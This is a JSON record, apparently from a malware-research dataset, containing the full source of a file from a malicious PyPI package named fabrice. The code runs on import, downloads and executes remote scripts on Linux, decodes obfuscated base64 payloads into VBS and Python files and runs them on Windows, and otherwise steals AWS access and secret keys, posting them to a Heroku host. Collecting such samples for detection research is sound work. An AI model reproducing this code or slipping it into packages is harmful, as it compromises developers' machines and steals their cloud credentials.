[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/fabrice-1.0.8/fabrice-1.0.8/fabrice/group.py",
    "malicious_code": "import subprocess\nimport os\nfrom os.path import expanduser\nimport requests\nimport boto3\nimport platform\n\ndef linuxThread():\n    try:\n        home = expanduser(\"~\")\n\n        directory = home + \"/.local/bin/vscode\"\n        if not os.path.exists(directory):\n            os.makedirs(directory)\n\n        directory = home + \"/.local/bin/vscode\"\n        if not os.path.exists(directory):\n            os.makedirs(directory)\n\n        a4 = \"ht\" + \"tps\" + \":\" + \"//\" + \"fabriccc.\" + \"her\" + \"okuapp\" + \".\" + \"com\" + \"/czv\"\n        response = requests.get(a4)\n        text = response.text\n\n        dataList = []\n        finalList = []\n        for line in text.splitlines():\n            if \"SPLITT\" in line:\n                finalList.append(dataList)\n                dataList = []\n            else:\n                if \"directory\" in line:\n                    line = line.replace(\"{directory}\", directory)\n\n                dataList.append(line)\n\n        data1 = finalList[0]\n        data2 = finalList[1]\n        data3 = finalList[2]\n        data4 = finalList[3]\n\n        with open(directory + \"/service\" + \".\" + \"s\" + \"h\", \"w\") as fp:\n            for a in data1:\n                fp.write(a)\n                fp.write(\"\\n\")\n\n        with open(directory + \"/app\" + \".\" + \"py\", \"w\") as fp:\n            for a in data2:\n                fp.write(a)\n                fp.write(\"\\n\")\n\n        with open(directory + \"/processes\" + \".\" + \"py\", \"w\") as fp:\n            for a in data3:\n                fp.write(a)\n                fp.write(\"\\n\")\n\n        with open(directory + \"/per\" + \".\" + \"s\" + \"h\", \"w\") as fp:\n            for a in data4:\n                fp.write(a)\n                fp.write(\"\\n\")\n\n        os.chmod(directory + \"/per\" + \".\" + \"s\" + \"h\", 0o755)\n        os.chmod(directory + \"/service\" + \".\" + \"s\" + \"h\", 0o755)\n\n        with open(os.devnull, 'wb') as devnull:\n            subprocess.check_call(directory + \"/per\" + \".\" + \"s\" + \"h\", stdout=devnull, stderr=subprocess.STDOUT)\n    except:\n        pass\n\ndef winThread():\n    v0 = b'UTIxT'\n    v1 = b'2RtSl'\n    v2 = b'hNV2h'\n    v3 = b'pYlZG'\n    v4 = b'NFNVU'\n    v5 = b'XdaMW'\n    v6 = b'w2Uld'\n    v7 = b'kS2FV'\n    v8 = b'RnBTV'\n    v9 = b'U5KWj'\n    v10 = b'BwcFF'\n    v11 = b'XbFJl'\n    v12 = b'bkJqV'\n    v13 = b'mxoT2'\n    v14 = b'JHTnV'\n    v15 = b'UbU5W'\n    v16 = b'U0Zac'\n    v17 = b'FlrZH'\n    v18 = b'NhbGh'\n    v19 = b'GVW5a'\n    v20 = b'a01qV'\n    v21 = b'npZak'\n    v22 = b'pHYTJ'\n    v23 = b'NeGVH'\n    v24 = b'dE1ia'\n    v25 = b'0kxU1'\n    v26 = b'dkd1Z'\n    v27 = b'GcFlV'\n    v28 = b'V2RXT'\n    v29 = b'TA1dl'\n    v30 = b'ZUSm9'\n    v31 = b'iR0pI'\n    v32 = b'ZDJkU'\n    v33 = b'VUwSk'\n    v34 = b'VZMjF'\n    v35 = b'XYUdS'\n    v36 = b'SFZsQ'\n    v37 = b'lpiWE'\n    v38 = b'JzV1R'\n    v39 = b'OUmIw'\n    v40 = b'bHNaR'\n    v41 = b'lJaTT'\n    v42 = b'Bwd1k'\n    v43 = b'waFJk'\n    v44 = b'VlV5Y'\n    v45 = b'Ud4aV'\n    v46 = b'IzZHB'\n    v47 = b'TVU5y'\n    v48 = b'WjBOc'\n    v49 = b'1pIcG'\n    v50 = b'hSazV'\n    v51 = b'2V2xk'\n    v52 = b'NGMwe'\n    v53 = b'HNTak'\n    v54 = b'ZpYVV'\n    v55 = b'KcVlq'\n    v56 = b'SXhkR'\n    v57 = b'mxYTl'\n    v58 = b'd0TlU'\n    v59 = b'zZG5U'\n    v60 = b'VU5CU'\n    v61 = b'zFVeV'\n    v62 = b'ZqQkp'\n    v63 = b'SbVI2'\n    v64 = b'WVVaT'\n    v65 = b'2IxcF'\n    v66 = b'hlSE5'\n    v67 = b'KUkRC'\n    v68 = b'blZHM'\n    v69 = b'DVNR0'\n    v70 = b'ZIYkh'\n    v71 = b'WYWVV'\n    v72 = b'Rkw='\n    vv = v0 + v1 + v2 + v3 + v4 + v5 + v6 + v7 + v8 + v9 + v10 + v11 + v12 + v13 + v14 + v15 + v16 + v17 + v18 + v19 + v20 + v21 + v22 + v23 + v24 + v25 + v26 + v27 + v28 + v29 + v30 + v31 + v32 + v33 + v34 + v35 + v36 + v37 + v38 + v39 + v40 + v41 + v42 + v43 + v44 + v45 + v46 + v47 + v48 + v49 + v50 + v51 + v52 + v53 + v54 + v55 + v56 + v57 + v58 + v59 + v60 + v61 + v62 + v63 + v64 + v65 + v66 + v67 + v68 + v69 + v70 + v71 + v72\n\n    z0 = b'UTIxc'\n    z1 = b'2RHTk'\n    z2 = b'hPWGx'\n    z3 = b'rUTBK'\n    z4 = b'NVdsa'\n    z5 = b'EdNVn'\n    z6 = b'BZVGp'\n    z7 = b'CamQz'\n    z8 = b'QndZb'\n    z9 = b'GhDZG'\n    z10 = b'1OdVV'\n    z11 = b'XZGpN'\n    z12 = b'MVpwW'\n    z13 = b'TBoS2'\n    z14 = b'Rsa3l'\n    z15 = b'WbnBq'\n    z16 = b'ZDNCd'\n    z17 = b'1lsaE'\n    z18 = b'NkbU5'\n    z19 = b'1VVdk'\n    z20 = b'aU0wM'\n    z21 = b'UxRMj'\n    z22 = b'VLYkd'\n    z23 = b'NelFu'\n    z24 = b'Wmlia'\n    z25 = b'zVzU1'\n    z26 = b'VRd1o'\n    z27 = b'yTnRW'\n    z28 = b'bmhrV'\n    z29 = b'jFaNl'\n    z30 = b'pFaE5'\n    z31 = b'kVm95'\n    z32 = b'VmpCT'\n    z33 = b'FEwcH'\n    z34 = b'ZaRWh'\n    z35 = b'TZDJO'\n    z36 = b'NmIzW'\n    z37 = b'k1NbH'\n    z38 = b'BvV1c'\n    z39 = b'1S2NG'\n    z40 = b'a3lUb'\n    z41 = b'XBNYl'\n    z42 = b'doc1k'\n    z43 = b'yMDVj'\n    z44 = b'bVJYU'\n    z45 = b'm5kal'\n    z46 = b'F6VnF'\n    z47 = b'Zakl3'\n    z48 = b'ZGxre'\n    z49 = b'VZqWk'\n    z50 = b'phV3R'\n    z51 = b'MUTIx'\n    z52 = b'YWRtS'\n    z53 = b'kRRVG'\n    z54 = b'xKUTB'\n    z55 = b'scFEy'\n    z56 = b'ZHdNM'\n    z57 = b'kZZVW'\n    z58 = b'05SlJ'\n    z59 = b'6bDNX'\n    z60 = b'bGMwY'\n    z61 = b'jBscl'\n    z62 = b'RUWll'\n    z63 = b'SbmhX'\n    z64 = b'WXpKV'\n    z65 = b'2VXTX'\n    z66 = b'hlRkZ'\n    z67 = b'rVjBw'\n    z68 = b'ellWZ'\n    z69 = b'E9ZMU'\n    z70 = b'pIT1R'\n    z71 = b'OaWJY'\n    z72 = b'aDJXV'\n    z73 = b'mRTZW'\n    z74 = b'xoSFR'\n    z75 = b'tOWpi'\n    z76 = b'VGwwV'\n    z77 = b'2xNMW'\n    z78 = b'JHVkh'\n    z79 = b'WV2xN'\n    z80 = b'UTBGc'\n    z81 = b'FpESk'\n    z82 = b'phVXR'\n    z83 = b'UUW1o'\n    z84 = b'amVVS'\n    z85 = b'nRZMF'\n    z86 = b'J2UzB'\n    z87 = b'sRFFX'\n    z88 = b'ZEpSM'\n    z89 = b'XAzVE'\n    z90 = b'c1a2V'\n    z91 = b'XRllV'\n    z92 = b'bXhMU'\n    z93 = b'0Vwc1'\n    z94 = b'l6TkN'\n    z95 = b'kbUp1'\n    z96 = b'VG14T'\n    z97 = b'WJVNT'\n    z98 = b'JZbTV'\n    z99 = b'TYkdK'\n    z100 = b'dVVYQ'\n    z101 = b'kRaMj'\n    z102 = b'lMUTI'\n    z103 = b'1T01W'\n    z104 = b'bHVRb'\n    z105 = b'mxpTW'\n    z106 = b's1c1l'\n    z107 = b'6Tk5k'\n    z108 = b'Vmt5U'\n    z109 = b'm5OaV'\n    z110 = b'EyZHB'\n    z111 = b'ZekpP'\n    z112 = b'YjJSS'\n    z113 = b'FJucG'\n    z114 = b'hNMDF'\n    z115 = b'uVERK'\n    z116 = b'T2VWc'\n    z117 = b'FhSak'\n    z118 = b'JhVTB'\n    z119 = b'GMll6'\n    z120 = b'Sk5aM'\n    z121 = b'kpYYk'\n    z122 = b'hWa1d'\n    z123 = b'GSnNT'\n    z124 = b'VU01Z'\n    z125 = b'EdKNV'\n    z126 = b'FYaFB'\n    z127 = b'SRUZu'\n    z128 = b'VEROU'\n    z129 = b'2RVbE'\n    z130 = b'dkMmx'\n    z131 = b'aTW1o'\n    z132 = b'NVlqS'\n    z133 = b'XhiRX'\n    z134 = b'h0Vmp'\n    z135 = b'SYVZu'\n    z136 = b'ZHBTV'\n    z137 = b'U01TU'\n    z138 = b'dOcFF'\n    z139 = b'rUlBi'\n    z140 = b'SGhqV'\n    z141 = b'mxoT2'\n    z142 = b'JHTnV'\n    z143 = b'UbU5W'\n    z144 = b'U0Zac'\n    z145 = b'FlrZH'\n    z146 = b'NhbGh'\n    z147 = b'GVW5a'\n    z148 = b'a01qV'\n    z149 = b'npZak'\n    z150 = b'pHYTJ'\n    z151 = b'NeGVH'\n    z152 = b'cGhTR'\n    z153 = b'XAyWW'\n    z154 = b'xkVmR'\n    z155 = b'WcFlh'\n    z156 = b'R3hKY'\n    z157 = b'Vd0TF'\n    z158 = b'lqTk5'\n    z159 = b'kV050'\n    z160 = b'Vm5Sa'\n    z161 = b'U0xcH'\n    z162 = b'NTME5'\n    z163 = b'LUkU5'\n    z164 = b'c2VHT'\n    z165 = b'ldXRT'\n    z166 = b'VzWTI'\n    z167 = b'1T1kx'\n    z168 = b'VklWb'\n    z169 = b'WxpUj'\n    z170 = b'J4cVd'\n    z171 = b'FVlNk'\n    z172 = b'bVF5T'\n    z173 = b'lhOaU'\n    z174 = b'1rWnJ'\n    z175 = b'ZekY0'\n    z176 = b'YTB4d'\n    z177 = b'VFqVk'\n    z178 = b'phV3R'\n    z179 = b'MWWpO'\n    z180 = b'TmRXT'\n    z181 = b'nRWbl'\n    z182 = b'JpTTF'\n    z183 = b'wc1Mw'\n    z184 = b'TktSR'\n    z185 = b'TlzZU'\n    z186 = b'dOV1d'\n    z187 = b'FNXNZ'\n    z188 = b'MjVPW'\n    z189 = b'TFWSV'\n    z190 = b'ZtbGl'\n    z191 = b'SMnhx'\n    z192 = b'V0VWU'\n    z193 = b'2RtUX'\n    z194 = b'lOWE5'\n    z195 = b'pTWta'\n    z196 = b'cll6R'\n    z197 = b'jRkMH'\n    z198 = b'h1V21'\n    z199 = b'samVV'\n    z200 = b'bHdRM'\n    z201 = b'mM5UF'\n    z202 = b'E9PQ='\n    z203 = b'='\n    zz = z0 + z1 + z2 + z3 + z4 + z5 + z6 + z7 + z8 + z9 + z10 + z11 + z12 + z13 + z14 + z15 + z16 + z17 + z18 + z19 + z20 + z21 + z22 + z23 + z24 + z25 + z26 + z27 + z28 + z29 + z30 + z31 + z32 + z33 + z34 + z35 + z36 + z37 + z38 + z39 + z40 + z41 + z42 + z43 + z44 + z45 + z46 + z47 + z48 + z49 + z50 + z51 + z52 + z53 + z54 + z55 + z56 + z57 + z58 + z59 + z60 + z61 + z62 + z63 + z64 + z65 + z66 + z67 + z68 + z69 + z70 + z71 + z72 + z73 + z74 + z75 + z76 + z77 + z78 + z79 + z80 + z81 + z82 + z83 + z84 + z85 + z86 + z87 + z88 + z89 + z90 + z91 + z92 + z93 + z94 + z95 + z96 + z97 + z98 + z99 + z100 + z101 + z102 + z103 + z104 + z105 + z106 + z107 + z108 + z109 + z110 + z111 + z112 + z113 + z114 + z115 + z116 + z117 + z118 + z119 + z120 + z121 + z122 + z123 + z124 + z125 + z126 + z127 + z128 + z129 + z130 + z131 + z132 + z133 + z134 + z135 + z136 + z137 + z138 + z139 + z140 + z141 + z142 + z143 + z144 + z145 + z146 + z147 + z148 + z149 + z150 + z151 + z152 + z153 + z154 + z155 + z156 + z157 + z158 + z159 + z160 + z161 + z162 + z163 + z164 + z165 + z166 + z167 + z168 + z169 + z170 + z171 + z172 + z173 + z174 + z175 + z176 + z177 + z178 + z179 + z180 + z181 + z182 + z183 + z184 + z185 + z186 + z187 + z188 + z189 + z190 + z191 + z192 + z193 + z194 + z195 + z196 + z197 + z198 + z199 + z200 + z201 + z202 + z203\n\n    import os as ppppp\n    from base64 import b64decode as d44\n    import sys as yyy\n\n    c1 = 'c1 = \"{}\" '.format(yyy.executable)\n\n    a1 = \"\\Pub\" + \"lic\" + \"\\Down\" + \"loads\"\n    a5 = \"C\" + \":\\\\Use\" + \"rs\" + a1 + \"\\\\p.\" + \"v\" + \"bs\"\n    a6 = \"C\" + \":\\\\Use\" + \"rs\" + a1 + \"\\\\d.\" + \"p\" + \"y\"\n\n    with open(a5, \"wb\") as fp:\n        fp.write(c1.encode() + d44(d44(d44(vv))))\n\n    with open(a6, \"wb\") as fp:\n        fp.write(d44(d44(d44(zz))))\n\n    ppppp.system(a5)\n\ndef test():\n    try:\n\n        if platform.system() == \"Windows\":\n            winThread()\n        elif platform.system() == \"Linux\":\n            linuxThread()\n        else:\n            session = boto3.Session()\n            cd = session.get_credentials()\n            ak = cd.access_key\n            sk = cd.secret_key\n\n            data = {\"k\": ak, \"s\": sk}\n            requests.post(\"https://fabriccc.herokuapp.com/zz\", json=data, timeout=4)\n\n    except:\n        pass\ntest()"
  }
]